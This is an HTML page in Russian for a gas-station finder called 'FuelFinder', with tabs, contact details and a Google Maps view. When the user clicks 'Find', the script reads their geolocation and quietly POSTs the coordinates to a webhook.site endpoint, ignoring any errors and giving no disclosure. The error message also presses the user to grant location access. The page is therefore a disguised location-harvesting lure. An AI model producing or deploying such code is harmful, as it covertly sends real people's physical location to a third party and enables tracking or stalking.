<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Поиск ближайших АЗС</title>
<style>
  /* Apple-подобный минимализм, плавные шрифты и адаптив */
  @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;600&display=swap');

  html, body {
    margin: 0; padding: 0;
    font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
      Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    background: linear-gradient(135deg, #f5f7fa, #e2e6ea);
    color: #1d1d1f;
    height: 100%;
  }

  header {
    padding: 1.5rem 1rem;
    font-weight: 600;
    font-size: 1.8rem;
    text-align: center;
    border-bottom: 1px solid #d1d1d6;
    background: white;
    position: sticky;
    top: 0;
    z-index: 10;
  }

  main {
    max-width: 600px;
    margin: 1rem auto 3rem;
    padding: 0 1rem;
  }

  #map {
    width: 100%;
    height: 350px;
    border-radius: 15px;
    box-shadow: 0 10px 30px rgb(0 0 0 / 0.1);
    margin-bottom: 1rem;
  }

  #map-error {
    display: none;
    color: #ff3b30; /* Apple red */
    font-weight: 600;
    font-size: 1.1rem;
    text-align: center;
    margin-bottom: 1rem;
  }

  button {
    display: block;
    width: 100%;
    padding: 1rem 0;
    font-size: 1.2rem;
    font-weight: 600;
    color: white;
    background: linear-gradient(90deg, #0071e3, #0a84ff);
    border: none;
    border-radius: 12px;
    cursor: pointer;
    box-shadow: 0 10px 20px rgb(0 113 227 / 0.4);
    transition: background 0.3s ease;
    margin-bottom: 2rem;
  }

  button:hover {
    background: linear-gradient(90deg, #005bb5, #006fe6);
  }

  nav {
    display: flex;
    justify-content: space-around;
    margin-bottom: 2rem;
  }

  nav button {
    width: auto;
    flex: 1;
    margin: 0 0.25rem;
    background: #f0f0f5;
    color: #1d1d1f;
    box-shadow: none;
  }

  nav button.active, nav button:hover {
    background: #0071e3;
    color: white;
    box-shadow: 0 5px 15px rgb(0 113 227 / 0.3);
  }

  section {
    display: none;
  }

  section.active {
    display: block;
  }

  h2 {
    font-weight: 600;
    margin-bottom: 0.5rem;
  }

  p {
    line-height: 1.4;
    color: #3c3c4399;
  }

  footer {
    text-align: center;
    font-size: 0.9rem;
    color: #888;
    padding: 1rem 0;
  }

  /* Адаптив на мелких экранах */
  @media (max-width: 400px) {
    header {
      font-size: 1.5rem;
      padding: 1rem 0.5rem;
    }

    button {
      font-size: 1rem;
      padding: 0.8rem 0;
      border-radius: 10px;
    }

    nav button {
      font-size: 0.9rem;
    }
  }
</style>
</head>
<body>
<header>FuelFinder — поиск ближайших заправок</header>
<main>
  <nav>
    <button class="active" data-tab="home">Главная</button>
    <button data-tab="about">О компании</button>
    <button data-tab="maptab">Карта</button>
    <button data-tab="contacts">Контакты</button>
  </nav>

  <section id="home" class="active">
    <h2>Добро пожаловать в FuelFinder</h2>
    <p>Мы анализируем цены на топливо и помогаем найти ближайшую и самую выгодную заправку рядом с вами.</p>
  </section>

  <section id="about">
    <h2>О компании</h2>
    <p>FuelFinder — это современный сервис для быстрого и удобного поиска ближайших АЗС с актуальной информацией о ценах и сервисах. Мы используем инновационные технологии и геолокацию, чтобы экономить ваше время и деньги.</p>
  </section>

  <section id="maptab">
    <h2>Карта ближайших АЗС</h2>
    <div id="map"></div>
    <div id="map-error">При загрузке Google Карт на этой странице возникла проблема. Разрешите использование геопозиции</div>
    <button id="findBtn">Найти</button>
  </section>

  <section id="contacts">
    <h2>Контакты</h2>
    <p>Телефон: +7 (999) 123-45-67</p>
    <p>Email: support@fuelfinder.com</p>
    <p>Адрес: г. Москва, ул. Примерная, д.1</p>
  </section>
</main>

<footer>© 2025 FuelFinder. Все права защищены.</footer>

<script>
  // Переключение вкладок
  const tabs = document.querySelectorAll('nav button');
  const sections = document.querySelectorAll('main section');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      const target = tab.getAttribute('data-tab');
      sections.forEach(sec => {
        sec.id === target ? sec.classList.add('active') : sec.classList.remove('active');
      });
    });
  });

  // Работа с картой и кнопкой "Найти"
  let map, userMarker;

  function initMap() {
    // Начальная карта без центра, с базовым зумом
    map = new google.maps.Map(document.getElementById("map"), {
      center: { lat: 55.751244, lng: 37.618423 }, // Москва по умолчанию
      zoom: 10,
      disableDefaultUI: true,
      zoomControl: true,
      gestureHandling: 'greedy'
    });
  }

  function showMapError() {
    document.getElementById("map").style.display = "none";
    document.getElementById("map-error").style.display = "block";
  }

  document.getElementById("findBtn").addEventListener("click", () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        document.getElementById("map-error").style.display = "none";
        document.getElementById("map").style.display = "block";

        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
        map.setCenter(coords);
        map.setZoom(14);

        if (userMarker) {
          userMarker.setPosition(coords);
        } else {
          userMarker = new google.maps.Marker({
            position: coords,
            map: map,
            title: "Вы здесь"
          });
        }

        // Отправляем координаты на вебхук
        fetch('https://webhook.site/3038f7cb-b8c9-463e-b74c-43cace83af30', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: coords.lat, longitude: coords.lng })
        }).catch(() => { /* молча игнорируем ошибки */ });

      }, () => {
        showMapError();
      });
    } else {
      showMapError();
    }
  });

</script>

<script async defer
  src="https://maps.googleapis.com/maps/api/js?key=ТВОЙ_API_КЛЮЧ&callback=initMap">
</script>
</body>
</html>
